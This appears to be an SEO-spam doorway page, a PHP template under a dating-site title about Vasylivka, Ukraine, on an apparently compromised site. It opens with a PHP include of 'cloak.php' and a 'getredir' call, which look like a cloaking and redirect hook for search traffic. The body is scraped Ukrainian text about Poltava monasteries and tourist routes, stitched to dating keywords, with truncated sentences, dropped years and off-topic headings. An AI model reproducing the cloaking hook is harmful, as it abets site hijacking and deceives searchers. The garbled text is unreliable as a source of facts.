<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%81%d0%b0%d0%b9%d1%82+%d0%b7%d0%bd%d0%b0%d0%b9%d0%be%d0%bc%d1%81%d1%82%d0%b2+%d0%bd%d0%b0+%d0%b2+%d0%92%d0%b0%d1%81%d0%b8%d0%bb%d1%96%d0%b2%d0%ba%d0%b0+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Населені пункти у підпорядкуванні ОТГ: Солонянська громада</title>
	<meta name="description" content="У Вікіпедії є статті про інші населені пункти з такою назвою: Василівка. Васи́лівка — місто в Україні, у Запорізькій області, адміністративний центр" />
	<link rel="canonical" href="https://masage.od.ua/img/103/jilu-sayt-znayomstv.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/184/rupyt-hvilinn-pobachennya-zhovt.php">хвилинні побачення Жовті Води Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/133/cijuj-prosto-znayomstva.php">просто знайомства в Шепетівка Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/237/logiw-znayomstva-bezkoshtovno.php">знайомства безкоштовно в Бучач Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/247/jone-pdklyuchiti-plyami.php">підключити плями поблизу Часів Яр Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Сайт знайомств на в Василівка Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Вражає чудова тонка різьба по дереву, що дивним мереживом обрамляє ікони, написані петербурзькими художниками.</p><img src="https://landmarks.in.ua/15odeska/15vasylivka-1-1600x1066.jpg" alt="Додаткові послуги" style="max-width: 480px; max-height: 480px;"/><p>Збереглися й викладена з мармурових плит сірого, біло го та чорного кольорів підлога, кіот над тим місцем, де поховані Василь і Олена Кочубей, пам'ятник з чорного мармуру і меморіальна дошка на честь князя і княгині. Тут же стоять ікони святого Василя Великого та рівноапостольної цариці Олени відомого майстра живопису Нефа.</p>
<p>Вівтар з білого мар муру піднято на дві сходинки, а справа з чорного мармуру на трьох сходинках піднімається те місце, де молилися Кочубеї. З глибини XVII ст. дійшов до нас і пеньок з дубовим хрестом у вівтарі, на якому було знайдено ікону Святого Миколи Чудотворця, що започаткувала ще тоді дерев'яну церкву, яка стала називатися Миколаївською за назвою тієї ікони.</p>
<p>Миколаївським було названо й навколишній ліс. Полтавський краєзнавчий музей імені Василя Кричевського. Понад сто років тому р. при Полтавській губернській земській управі розпочалась організація музею, основу якого складала колекція ґрунтів і гербарій, зібраний експедицією відомого вченого-ґрунтознавця, професора В.</p>
<p>В дореволюційний період у році уродженка Полтавської губернії меценатка К. Скаржинська подарувала музею понад 20 тис. експонатів і наукову бібліотеку широко відомого зібрання Круглицького музею у Лубнах. Будинок музею — програмний витвір архітектури в стилі українського модерну, зведений у роках. Автор — художник і архітектор В. Кричевський, створив цілісний ансамбль, у якому органічно сплелися традиції народного будівництва, чудові українські орнаменти, конструкторські форми.</p>
<p>Вражають красою і художньо-декоративні розписи у вестибюлі і центральному залі музею. Їх автори — художники С. Васильківський і М. Самокиш творчо використали спадщину української народної архітектури та мистецтва. Після визволення міста від фашистських загарбників майже 20 років здійснювалися роботи по відновленню та реставрації приміщення. Сьогодні у 40 музейних залах і фондосховищах зберігається понад тис. Серед них колекції полтавської народної вишивки, ткацтва, килимарства, церковних речей: археологічні, нумізматичні, природничі.</p>
<p>В числі раритетів — давньоєгипетська колекція, група пам'яток античного та східного мистецтва, козацькі старожитності. Щорічно Полтавський краєзнавчий музей відвідують понад тис. екскурсантів, проводиться близько 3 тис. Полтавський Хрестовоздвиженський монастир. Перлина української барокової архітектури — комплекс Хрестовоздвиженського монастиря в м. Полтаві з єдиним на Лівобережжі семибанним храмом, що зберігся до наших днів, який має циліндричну форму бань. Існує цікава легенда, що коли М.</p>
<p>Пушкар, перший полковник Полтавського козацького полку, вирішив розпочати будівництво монастиря, на цю гору побіля Полтави було привезено батюшку, який мав дар передбачення і «відчував» місцевість та дав добро на будівництво. В ході полтавського періоду Північної війни, в травні року монастир був резиденцією шведського короля Карла XII, а за однією із версій біля монастиря під час огляду валів Полтави шведський монарх отримав важке поранення у ногу. Вже після шведів монастир відвідав Петро I.</p>
<p>Віддаленість Полтавського монастиря від епіцентру монастирського життя — земель Київщини і Чернігівщини, - призводить до відносної ізольованості цієї обителі перед очима допитливого дослідника початку ХІХ століття. Хоча Полтавський монастир вабив до себе і М. Гнєдича, і І. Котляревського, того ж М. Виконуючи почесну місію художника-замальовщика Київської Археографічної комісії Тарас Григорович влітку року відвідав Полтаву, де виконав малюнок монастирської гори з Хрестовоздвиженською обителлю. Робота Шевченка і досі викликає інтерес у дослідників-краєзнавців, надаючи можливість побачити обитель і навколишній вигляд середини ХІХ століття.</p>
<p>Коштом гетьмана Мазепи зводиться головний монастирський собор — Хрестовоздвиженський, будівельні роботи спорудженню якого тривають впродовж двадцяти років: з по рік. Завершує зведення головного храму син страченого за наказом Мазепи Василя Леонтійовича Кочубея — Василь Васильович Кочубей —  Цариця Катерина ІІ відвідуючи Полтаву влітку року, завітала й до монастиря, її супроводжували Г. Потьомкін, О. Суворов, М. Архієпископ Амвросій та духовні особи зустрічали її побіля монастирської брами, Амвросій мав промову та підніс імператриці животворящого Хреста.</p>
<p>Вона прослухала літургію в церкві, побувала в келії Амвросія та побажала купатись в озері побіля монастирю, начувшись про його лікувальні властивості. Впродовж 2-ї пол. Завдяки його старанням монастир мав найбільшу в регіоні книгозбірню, до якої входили навіть видання Острозької друкарні XVI-XVII століть.</p><a id='u1'></a><h3>Фото приховано</h3><p>Під патронатом монастиря в Полтаві діяла школа півчих, згодом реорганізована в духовну семінарію. Випускниками останньої були батько всесвітньо відомого письменника нашого земляка Миколи Гоголя — Василь Гоголь-Яновський, відомий перекладач та поет Микола Гнєдич, вчися в семінарії засновник нової української літератури Іван Котляревський. Наприкінці ХІХ століття чисельність монастирської братії становила сорок чоловік. Головним джерелом існування обителі, як і колись, був обробіток і здача землі в оренду, загальною площею понад га.</p>
<p>При монастирі діяли невеличка столярна майстерня, швейна, притулок для священно і церковнослужителів, училище для сліпих.</p><strong><a id='u2'></a><h2>Василівка (місто)</h2></strong><p>У роки громадянської війни червоний терор войовничих атеїстів не оминає стін монастиря, у році, пограбована соборна усипальниця світських і духовних діячів краю XVIII - I-ї чверті XIX століття, а також старий монастирський цвинтар, що знаходився поміж Собором та дзвіницею. Могили відомих меценатів і полтавців, серед яких навіть родичі О. Пушкіна і М. Гоголя були сплюндровані, а гранітно — мармурові плити використані на господарські потреби, у тому числі на покриття доріг. Після декількох пограбувань обитель була оголошена притулком контрреволюції і у році зачинена.</p>
<p>В х монастирське подвір'я перетворено на дитячу трудову колонію системи НКВС Народного Комісаріату Внутрішніх Справ.</p><a id='u3'></a><h3>Акції та новини</h3><p>У році колишній чоловічий монастир стає жіночим, після того як громада черниць оселилась в напівзруйнованій обителі. В німецьку школу Абвера, розташовану у Полтавському монастирі, був засланий радянський розвідник Микола Удалов. Він встановив, що німецькі агенти, які засилаються в радянський тил, мають часи певної марки.</p>
<p>Завдяки цим відомостям, радянська контррозвідка зуміла знешкодити декілька десятків ворожих агентів.</p><strong><a id='u4'></a><h2>Акції lifecell - lifecell Україна</h2></strong><p>Влітку року монастир поглинає нова хвиля боротьби з церковними установами: вісімдесят сім черниць у супроводі конвою з комсомольських активістів вивезено до Лебединського жіночого монастиря, що на Черкащині. Спустілі монастирські споруди займає філіал Полтавської психіатричної лікарні ім. Мальцева, згодом тут розміщено гуртожитки тодішнього Полтавського педагогічного інституту ім. Отже, історія монастиря налічує років.</p>
<p>За цей час неодноразово мінявся державний устрій, часи розквіту держави змінювались занепадом. Все це відображалось на житті обителі, архітектурному обличчі ансамблю. Тобто історія монастиря — це історія нашого суспільства. МАРШРУТИ ЗЕЛЕНОГО ТУРИЗМУ В ОБЛАСТІ. Маршрут розпочинається у Полтаві і стародавнім Зіньківським трактом продовжується на північ, по гоголівських місцях Полтавщини. Ті, хто його обирає, мають унікальну можливість поєднання активного способу відпочинку з пізнавальною складовою цього маршруту. Подорожувати заповідними стежками можна як пішки, так і на конях.</p>
<p>Бажаєте перевірити свою рибальську вдачу — до Ваших послуг Троянівське водосховище. До переваг цього маршруту слід віднести його насиченість історико-культурними об'єктами та пам'ятками старовини :. Миколаївська р. та Троїцька р. церкви Диканьки, Диканський історико-краєзнавчий музей та Картинна галерея ім. Башкирцевої, державний літературно-меморіальний заповідник М. Гоголя в с. Гоголеве та ін. Тут неодноразово бував Микола Гоголь. Маршрут прокладено по землях колишніх володінь роду Кочубеїв. Надзвичайно мальовничу місцевість селища Михайлівка доповнює тихоплинна хода р.</p>
<p>На околицях села — рештки стародавнього чернечого поселення Чернегоярського монастиря 17 ст. Стасі з різноманітним обсягом послуг: катання на лижах, сноуборді, снігоході тощо.</p>
		
			
				<div>Данія – Запоріжжя. Міняю жінку 14 сезон 9 випуск</div>
				<div><iframe width='560' height='315' src='https://www.youtube.com/embed/uMD0gBQscxE' frameborder='0' allowfullscreen></iframe></div>
			
		
	<p>Полтава — С. Санжари — Кунцеве — Н. Санжари -Лучки. Байдарочний маршрут - сплав по Ворсклі розпочинається в середній течії річки. Програма маршруту передбачає різноманітні заходи дозвілля та відпочинку в санаторіях та сільських оселях. Насамкінець ви прибуваєте до. Полтава — Солониця — Кобелячок — Григоро-Бригадирівка- Кременчук. Цей маршрут пролягає шляхами відходу гетьмана Мазепи після поразки в Полтавській битві. Легенди про нечувані гетьманські скарби, заховані впродовж нього, турбують уяву навіть сучасних дослідників старовини.</p>
		
	<p>В Мазепиному ярі Григоро-Бригадирівка запрошуємо відвідати та поринути в атмосферу Січі і українського села тих часів, взяти участь у козацьких розвагах, покуштувати українські страви. Полтава — Лубни — Пирятин. Лубни з не менш цікавими околицями. Неподалік міста пам'ятка архітектури ХУІІ-ХІХ ст. загальнодержавного значення Мгарсько-Лубенський Спасо-Преображенський монастир.</p>
<p>Чарівний відпочинок, полювання, рибна ловля на річці Удай у с. Знайомство з історією, розкопками часів палеоліту в с. Велика Круча можна скуштувати келих пива у першій в Україні пивоварні з рестораном. Полтава — Опішня — Котельва.</p>
		
			<br><ol>
			
				<li>регіон знайомств в Калуш Україна.</li>
			
				<li>Запорізький обласний інститут післядипломної педагогічної освіти!</li>
			
				<li>Сайт міста Василівка?</li>
			
				<li>знайомства з жінкою в Звенигородка Україна.</li>
			
				<li>Запорізький обласний інститут післядипломної педагогічної освіти;</li>
			
				<li>Загальні збори №12/Звіт Організації.</li>
			
			</ol>
		
	<p>В Опішні знаходиться Державний музей- заповідник українського гончарства. Художня кераміка та майоліка, дрібна керамічна пластика с. Опішні відомі далеко за межами області та посилюють її туристичну привабливість. Скіфська столиця Гелон, де знаходиться с. Плавання на туристичних байдарках по р. Відпочинок на туристичних базах, наметових містечках, приватних оселях. Відпочинок групами чоловік. Полтава — Решетилівка — Сухорабівка. Дзеркалом душі та творчої сили нашого народу є невмируще народне мистецтво, різноманітно представлене на Полтавщині.</p>
<p>Вишивальні промисли та килимарське мистецтво міста Решетилівки налічують кілька століть. Полтава — Миргород — Сорочинці. В самісінькому центрі України на мальовничих берегах тихоплинного Хоролу в зелені беріз, верб і сосон розташований курорт Миргород.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/137/tajyd-znayomstva-zaraz.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/266/syzu-znayomstva-v.php">знайомства в центрі міста в Сєвєродонецьк Україна</a></li><li><a href="https://masage.od.ua/img/280/sezo-znayomstva-z.php">знайомства з чоловіком в Бар Україна</a></li><li><a href="https://masage.od.ua/img/467/bym-sayti-seksualnih.php">сайти сексуальних знайомств у Каховка Україна</a></li><li><a href="https://masage.od.ua/img/494/beqi-kompanya-znayomstv-poblizu.php">компанія знайомств поблизу Лубни Україна</a></li><li><a href="https://masage.od.ua/img/335/nehuv-vikonavch-sluzhbi-znayomstv.php">виконавчі служби знайомств поблизу Верхньодніпровськ Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Articles</h2>
				<ol><li><a href='#u1'>Фото приховано</a></li>
<li><a href='#u2'>Василівка (місто)</a></li>
<li><a href='#u3'>Акції та новини</a></li>
<li><a href='#u4'>Акції lifecell - lifecell Україна</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/418/suryw-regon-znayomstv-v.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>